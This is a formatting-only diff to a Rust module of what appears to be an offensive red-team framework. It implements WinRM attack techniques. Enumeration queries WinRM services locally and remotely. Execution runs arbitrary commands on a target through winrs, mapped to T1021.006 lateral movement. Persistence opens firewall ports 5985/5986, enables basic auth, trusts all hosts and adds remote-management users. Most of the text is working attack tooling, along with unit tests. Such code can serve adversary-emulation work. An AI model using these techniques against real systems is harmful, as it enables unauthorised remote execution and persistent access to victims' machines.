@@ -12,8 +12,8 @@
 //! - **WinrmPersistence**: Enable/configure WinRM service for persistent remote access
 
 use nexus_common::{
-    AttackTechnique, ExecutionContext, NexusError, Platform, Result, Tactic,
-    TechniqueParams, TechniqueResult,
+    AttackTechnique, ExecutionContext, NexusError, Platform, Result, Tactic, TechniqueParams,
+    TechniqueResult,
 };
 
 // ---------------------------------------------------------------------------
@@ -58,7 +58,11 @@ impl AttackTechnique for WinrmEnumeration {
     }
 
     fn validate(&self, params: &TechniqueParams) -> Result<()> {
-        let mode = params.parameters.get("mode").map(|s| s.as_str()).unwrap_or("service_local");
+        let mode = params
+            .parameters
+            .get("mode")
+            .map(|s| s.as_str())
+            .unwrap_or("service_local");
         match mode {
             "service_local" | "config" | "listeners" | "users" => Ok(()),
             "service_remote" | "wmic_remote" => {
@@ -85,42 +89,44 @@ impl AttackTechnique for WinrmEnumeration {
         {
             use std::process::Command;
 
-            let mode = params.parameters.get("mode").map(|s| s.as_str()).unwrap_or("service_local");
-            let target = params.parameters.get("target").map(|s| s.as_str()).unwrap_or("");
+            let mode = params
+                .parameters
+                .get("mode")
+                .map(|s| s.as_str())
+                .unwrap_or("service_local");
+            let target = params
+                .parameters
+                .get("target")
+                .map(|s| s.as_str())
+                .unwrap_or("");
 
             let output = match mode {
-                "service_local" => {
-                    Command::new("sc").args(&["query", "winrm"]).output()
-                }
+                "service_local" => Command::new("sc").args(&["query", "winrm"]).output(),
                 "service_remote" => {
                     let remote = format!("\\\\{}", target);
-                    Command::new("sc").args(&[&remote, "query", "winrm"]).output()
-                }
-                "config" => {
-                    Command::new("winrm").args(&["get", "winrm/config"]).output()
-                }
-                "listeners" => {
-                    Command::new("winrm")
-                        .args(&["enumerate", "winrm/config/listener"])
+                    Command::new("sc")
+                        .args(&[&remote, "query", "winrm"])
                         .output()
                 }
-                "users" => {
-                    Command::new("net")
-                        .args(&["localgroup", "Remote Management Users"])
-                        .output()
-                }
-                "wmic_remote" => {
-                    Command::new("wmic")
-                        .args(&[
-                            &format!("/node:{}", target),
-                            "service",
-                            "where",
-                            "name=\"winrm\"",
-                            "get",
-                            "name,state,startmode",
-                        ])
-                        .output()
-                }
+                "config" => Command::new("winrm")
+                    .args(&["get", "winrm/config"])
+                    .output(),
+                "listeners" => Command::new("winrm")
+                    .args(&["enumerate", "winrm/config/listener"])
+                    .output(),
+                "users" => Command::new("net")
+                    .args(&["localgroup", "Remote Management Users"])
+                    .output(),
+                "wmic_remote" => Command::new("wmic")
+                    .args(&[
+                        &format!("/node:{}", target),
+                        "service",
+                        "where",
+                        "name=\"winrm\"",
+                        "get",
+                        "name,state,startmode",
+                    ])
+                    .output(),
                 _ => unreachable!(), // validated above
             }
             .map_err(|e| {
@@ -220,10 +226,7 @@ impl AttackTechnique for WinrmExecution {
             use std::process::Command;
 
             let target = params.parameters.get("target").unwrap();
-            let command = params
-                .parameters
-                .get("command")
-                .unwrap_or(&params.command);
+            let command = params.parameters.get("command").unwrap_or(&params.command);
 
             let mut args: Vec<String> = Vec::new();
             args.push(format!("-r:{}", target));
@@ -239,12 +242,9 @@ impl AttackTechnique for WinrmExecution {
 
             args.push(command.clone());
 
-            let output = Command::new("winrs")
-                .args(&args)
-                .output()
-                .map_err(|e| {
-                    NexusError::TaskExecutionError(format!("winrs execution failed: {}", e))
-                })?;
+            let output = Command::new("winrs").args(&args).output().map_err(|e| {
+                NexusError::TaskExecutionError(format!("winrs execution failed: {}", e))
+            })?;
 
             let stdout = String::from_utf8_lossy(&output.stdout).to_string();
             let stderr = String::from_utf8_lossy(&output.stderr).to_string();
@@ -320,7 +320,11 @@ impl AttackTechnique for WinrmPersistence {
     }
 
     fn validate(&self, params: &TechniqueParams) -> Result<()> {
-        let mode = params.parameters.get("mode").map(|s| s.as_str()).unwrap_or("");
+        let mode = params
+            .parameters
+            .get("mode")
+            .map(|s| s.as_str())
+            .unwrap_or("");
         match mode {
             "quickconfig" | "trust_all" | "enable_basic" | "firewall" | "autostart"
             | "registry" | "full" => Ok(()),
@@ -351,7 +355,11 @@ impl AttackTechnique for WinrmPersistence {
         {
             use std::process::Command;
 
-            let mode = params.parameters.get("mode").map(|s| s.as_str()).unwrap_or("");
+            let mode = params
+                .parameters
+                .get("mode")
+                .map(|s| s.as_str())
+                .unwrap_or("");
 
             let modes: Vec<&str> = if mode == "full" {
                 vec![
@@ -383,17 +391,29 @@ impl AttackTechnique for WinrmPersistence {
                         let r1 = run_cmd(
                             "netsh",
                             &[
-                                "advfirewall", "firewall", "add", "rule",
-                                "name=WinRM-HTTP", "dir=in", "action=allow",
-                                "protocol=TCP", "localport=5985",
+                                "advfirewall",
+                                "firewall",
+                                "add",
+                                "rule",
+                                "name=WinRM-HTTP",
+                                "dir=in",
+                                "action=allow",
+                                "protocol=TCP",
+                                "localport=5985",
                             ],
                         );
                         let r2 = run_cmd(
                             "netsh",
                             &[
-                                "advfirewall", "firewall", "add", "rule",
-                                "name=WinRM-HTTPS", "dir=in", "action=allow",
-                                "protocol=TCP", "localport=5986",
+                                "advfirewall",
+                                "firewall",
+                                "add",
+                                "rule",
+                                "name=WinRM-HTTPS",
+                                "dir=in",
+                                "action=allow",
+                                "protocol=TCP",
+                                "localport=5986",
                             ],
                         );
                         format!("{}\n{}", r1, r2)
@@ -535,7 +555,10 @@ mod tests {
     fn test_winrm_exec_metadata() {
         let tech = WinrmExecution;
         assert_eq!(tech.technique_id(), "T1021.006");
-        assert_eq!(tech.tactics(), &[Tactic::Execution, Tactic::LateralMovement]);
+        assert_eq!(
+            tech.tactics(),
+            &[Tactic::Execution, Tactic::LateralMovement]
+        );
         assert_eq!(tech.task_types(), vec!["winrm_exec"]);
     }
 
@@ -569,7 +592,10 @@ mod tests {
             .is_err());
         // With target
         assert!(tech
-            .validate(&make_params(&[("mode", "service_remote"), ("target", "HOST1")]))
+            .validate(&make_params(&[
+                ("mode", "service_remote"),
+                ("target", "HOST1")
+            ]))
             .is_ok());
     }
 
@@ -587,9 +613,7 @@ mod tests {
         // Missing both
         assert!(tech.validate(&make_params(&[])).is_err());
         // Missing command
-        assert!(tech
-            .validate(&make_params(&[("target", "HOST1")]))
-            .is_err());
+        assert!(tech.validate(&make_params(&[("target", "HOST1")])).is_err());
         // All present
         assert!(tech
             .validate(&make_params(&[("target", "HOST1"), ("command", "whoami")]))
@@ -621,7 +645,10 @@ mod tests {
             .validate(&make_params(&[("mode", "add_user")]))
             .is_err());
         assert!(tech
-            .validate(&make_params(&[("mode", "add_user"), ("username", "DOMAIN\\user")]))
+            .validate(&make_params(&[
+                ("mode", "add_user"),
+                ("username", "DOMAIN\\user")
+            ]))
             .is_ok());
     }
 
